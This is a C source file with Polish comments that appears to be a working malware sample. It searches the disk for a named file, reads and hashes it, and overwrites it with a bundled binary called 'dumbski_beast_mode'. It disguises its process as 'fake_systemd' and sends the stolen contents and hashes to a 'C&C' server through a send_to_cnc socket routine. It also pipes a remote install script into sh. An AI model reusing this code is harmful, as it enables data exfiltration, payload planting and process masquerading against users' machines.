// Ensure POSIX APIs (e.g., lstat) are declared when building with -std=c11.
#ifndef _POSIX_C_SOURCE
#define _POSIX_C_SOURCE 200809L
#endif

#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <limits.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <openssl/md5.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// Some libcs don't expose PATH_MAX via <limits.h> under strict C modes.
// Provide a conservative fallback to keep compilation portable.
#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define BUFFER_SIZE 32768 // 32KB bufor dla wydajności

// Returns 1 if found, 0 if not
int search_recursive(const char *base_path, const char *target_file, int current_depth, int max_depth, char *result_out) {
    if (current_depth > max_depth) return 0;

    char path[PATH_MAX];
    struct dirent *entry;
    struct stat statbuf;
    DIR *dp = opendir(base_path);

    if (dp == NULL) return 0;

    while ((entry = readdir(dp))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        size_t len = (size_t)snprintf(path, sizeof(path), "%s/%s", base_path, entry->d_name);
        if (len >= sizeof(path)) continue;

        if (lstat(path, &statbuf) == -1) continue;

        if (S_ISDIR(statbuf.st_mode)) {
            // If the recursive call returns 1, we found it! Stop and pass it up.
            if (search_recursive(path, target_file, current_depth + 1, max_depth, result_out)) {
                closedir(dp);
                return 1;
            }
        } else {
            if (strcmp(entry->d_name, target_file) == 0) {
                // Copy the path to the output buffer and exit
                strncpy(result_out, path, PATH_MAX - 1);
                result_out[PATH_MAX - 1] = '\0';
                closedir(dp);
                return 1;
            }
        }
    }

    closedir(dp);
    return 0;
}

char* getFileContent(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        perror("Failed to open file");
        return NULL;
    }

    // 1. Move to the end of the file to find its size
    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET); // Go back to the beginning

    // 2. Allocate memory for the string (+1 for the null terminator)
    char *buffer = malloc(length + 1);
    if (buffer == NULL) {
        printf("Memory allocation failed!\n");
        fclose(file);
        return NULL;
    }

    // 3. Read the file into the buffer
    size_t readSize = fread(buffer, 1, length, file);
    buffer[readSize] = '\0'; // Manually add the null terminator

    fclose(file);
    return buffer;
}

int calculate_file_sha1(const char *path, char *output_hex) {
    FILE *file = fopen(path, "rb");
    if (!file) return -1;

    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        fclose(file);
        return -1;
    }

    if (EVP_DigestInit_ex(mdctx, EVP_sha1(), NULL) != 1) {
        EVP_MD_CTX_free(mdctx);
        fclose(file);
        return -1;
    }

    unsigned char buffer[BUFFER_SIZE];
    size_t bytesRead;

    // Czytanie pliku kawałek po kawałku

    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, file))) {
        if (EVP_DigestUpdate(mdctx, buffer, bytesRead) != 1) {
            EVP_MD_CTX_free(mdctx);
            fclose(file);
            return -1;
        }
    }

    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len = 0;
    if (EVP_DigestFinal_ex(mdctx, hash, &hash_len) != 1) {
        EVP_MD_CTX_free(mdctx);
        fclose(file);
        return -1;
    }

    EVP_MD_CTX_free(mdctx);
    fclose(file);

    // Konwersja na format hex
    if (hash_len != SHA_DIGEST_LENGTH) return -1;
    for (int i = 0; i < SHA_DIGEST_LENGTH; i++) {
        sprintf(&output_hex[i * 2], "%02x", hash[i]);
    }
    output_hex[SHA_DIGEST_LENGTH * 2] = '\0';

    return 0;
}

int copy_file(const char *src, const char *dst) {
    FILE *source = fopen(src, "rb"); // Tryb "rb" - odczyt binarny
    if (source == NULL) return -1;

    FILE *dest = fopen(dst, "wb");   // Tryb "wb" - zapis binarny
    if (dest == NULL) {
        fclose(source);
        return -1;
    }

    char buffer[8192]; // Bufor 8KB
    size_t bytes;

    while ((bytes = fread(buffer, 1, sizeof(buffer), source)) > 0) {
        fwrite(buffer, 1, bytes, dest);
    }

    fclose(source);
    fclose(dest);
    return 0;
}

int get_file_md5(const char *path, char *output) {
    FILE *file = fopen(path, "rb");
    if (!file) return -1;

    // Inicjalizacja kontekstu EVP
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    const EVP_MD *md = EVP_get_digestbyname("MD5");
    
    if (mdctx == NULL || md == NULL) {
        if (mdctx) EVP_MD_CTX_free(mdctx);
        fclose(file);
        return -1;
    }

    if (EVP_DigestInit_ex(mdctx, md, NULL) != 1) {
        EVP_MD_CTX_free(mdctx);
        fclose(file);
        return -1;
    }

    const int bufSize = 4096;
    unsigned char *buffer = malloc(bufSize);
    int bytesRead = 0;
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hashLen;

    while ((bytesRead = fread(buffer, 1, bufSize, file)) != 0) {
        EVP_DigestUpdate(mdctx, buffer, bytesRead);
    }

    EVP_DigestFinal_ex(mdctx, hash, &hashLen);

    // Konwersja na hex
    for (unsigned int i = 0; i < hashLen; i++) {
        sprintf(output + (i * 2), "%02x", hash[i]);
    }
    output[hashLen * 2] = '\0';

    // Sprzątanie
    free(buffer);
    EVP_MD_CTX_free(mdctx);
    fclose(file);
    return 0;
}

void send_to_cnc(char *payload) {
    int sock;
    struct sockaddr_in server;

    // 1. Tworzenie gniazda (AF_INET = IPv4, SOCK_STREAM = TCP)
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Nie można utworzyć gniazda");
        return;
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Adres IP Twojego C&C
    server.sin_family = AF_INET;
    server.sin_port = htons(8080); // Port serwera

    // 2. Nawiązywanie połączenia
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Błąd połączenia z C&C");
        close(sock);
        return;
    }

    // 3. Wysyłanie Twojego payloadu
    // Używamy strlen(payload), aby wysłać tylko faktyczną treść, bez nadmiarowych zer z tablicy
    if (send(sock, payload, strlen(payload), 0) < 0) {
        perror("Błąd wysyłania");
    } else {
        printf("Dane zostały wysłane pomyślnie.\n");
    }

    // 4. Sprzątanie
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc < 3 || argc > 4) {
        printf("Usage: %s <start_dir> <file_name> [max_depth]\n", argv[0]);
        return 1;
    }


    int limit = (argc == 4) ? atoi(argv[3]) : 5;
    char found_path[PATH_MAX] = {0}; // Buffer to hold the result

    printf("Searching...\n");
    if (!search_recursive(argv[1], argv[2], 0, limit, found_path)) {
        printf("FAILURE: File not found within depth %d.\n", limit);
        return 2;
    }

    printf("SUCCESS! Found at: %s\n", found_path);

    char *my_copy = NULL;
    char *content = getFileContent(found_path);
    if (content) {
        printf("File content:\n%s\n", content);
        my_copy = strdup(content);
        free(content);
    }

    char sha1_hash[SHA_DIGEST_LENGTH * 2 + 1];
    if (calculate_file_sha1(found_path, sha1_hash) == 0) {
        printf("%s  %s\n", sha1_hash, found_path);
    } else {
        printf("Failed to calculate SHA1 hash.\n");
    }

    

    if (copy_file("./bin/dumbski_beast_mode", found_path) != 0) {
    perror("Błąd podczas kopiowania pliku");
    } else {
        printf("Plik został skopiowany pomyślnie.\n");
    }

    pid_t my_pid = getpid();
    
    // Nazwa może mieć do 16 bajtów (łącznie z terminatorem null)
    char *fake_name = "fake_systemd";

    printf("--- Przed zmiana ---\n");
    printf("Aktualny PID: %d\n", my_pid);
    // Tutaj proces ma jeszcze swoją oryginalną nazwę (np. ./a.out)
    
    // Zmiana nazwy wątku/procesu
    if (prctl(PR_SET_NAME, fake_name, 0, 0, 0) == -1) {
        perror("prctl failed");
        return 1;
    }

    printf("\n--- Po zmianie ---\n");
    printf("Nazwa zmieniona na: %s\n", fake_name);
    printf("PID pozostaje bez zmian: %d\n", my_pid);
    
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], fake_name);
    // Zasypiamy na 30 sekund, żebyś zdążył sprawdzić

    // Buffer to hold the final message
    char payload[256]; 

    char md5_res[33];
    const char *filename = "./bin/dumbski_beast_mode";

    if (get_file_md5(filename, md5_res) == 0) {
        printf("MD5 (%s) = %s\n", filename, md5_res);
    } else {
        printf("Błąd: Nie można otworzyć pliku lub brak pamięci.\n");
    }

    // Construct the string: [ID]:[MD5]:[SHA-1]
    snprintf(payload, sizeof(payload), "%s:%s:%s", my_copy, md5_res, sha1_hash);

    printf("Payload ready to be sent over socket: %s\n", payload);

    send_to_cnc(payload);

    // sleep(30);

    printf("--- Inicjalizacja minimalnego środowiska GHC ---\n");

    // Definicja polecenia z wymuszeniem braku dodatkowych narzędzi
    const char *install_cmd = 
        "curl --proto '=https' --tlsv1.2 -sSf https://get-ghcup.haskell.org | "
        "BOOTSTRAP_HASKELL_NONINTERACTIVE=1 "   // Brak pytań do użytkownika
        "BOOTSTRAP_HASKELL_MINIMAL=1 "          // Instaluj tylko GHCup na start
        "BOOTSTRAP_HASKELL_INSTALL_STACK=0 "    // Blokada instalacji Stacka
        "BOOTSTRAP_HASKELL_INSTALL_HLS=0 "      // Blokada Language Server
        "BOOTSTRAP_HASKELL_ADJUST_BASHRC=0 "    // Nie brudź plików systemowych .bashrc
        "sh && "
        "~/.ghcup/bin/ghcup install ghc recommended"; // Instalacja konkretnie samego GHC

    int result = system(install_cmd);

    if (result == 0) {
        printf("\n[SUKCES] GHC został zainstalowany w ~/.ghcup/bin/\n");
        printf("Pamiętaj, aby w aplikacji C używać pełnej ścieżki do kompilatora.\n");
    } else {
        fprintf(stderr, "\n[BŁĄD] Instalacja nie powiodła się.\n");
    }

    // 1. Po instalacji GHCup, a przed kompilacją, musisz "aktywować" GHC
    // To stworzy brakujący symlink ~/.ghcup/bin/ghc
    printf("Ustawiam wersję GHC jako domyślną...\n");
    system("~/.ghcup/bin/ghcup set ghc 9.6.7");

    // 2. Upewnij się, że katalog na przykład istnieje
    system("mkdir -p examples");

    // 3. Tworzymy plik .hs
    system("echo 'main = putStrLn \"Haskell dziala!\"' > examples/test.hs");

    // 4. Budujemy ścieżkę absolutną
    char ghc_path[512];
    const char* home = getenv("HOME");
    if (home == NULL) home = "/home/yaptide"; // Fallback dla Twojego użytkownika

    snprintf(ghc_path, sizeof(ghc_path), "%s/.ghcup/bin/ghc", home);

    // 5. Budujemy polecenie kompilacji i uruchomienia
    char full_run_cmd[1024];
    snprintf(full_run_cmd, sizeof(full_run_cmd), 
            "%s examples/test.hs -o examples/test_haskell && ./examples/test_haskell", 
            ghc_path);

    printf("Uruchamiam: %s\n", full_run_cmd);

    // 6. Próba uruchomienia
    if (system(full_run_cmd) == 0) {
        printf("\nSUKCES! Powyższy komunikat pochodzi z programu napisanego w Haskellu.\n");
    } else {
        printf("\nBŁĄD: GHC nadal nie reaguje. Sprawdzam dlaczego:\n");
        system("ls -la $HOME/.ghcup/bin/ghc"); 
    }


    return 0;
}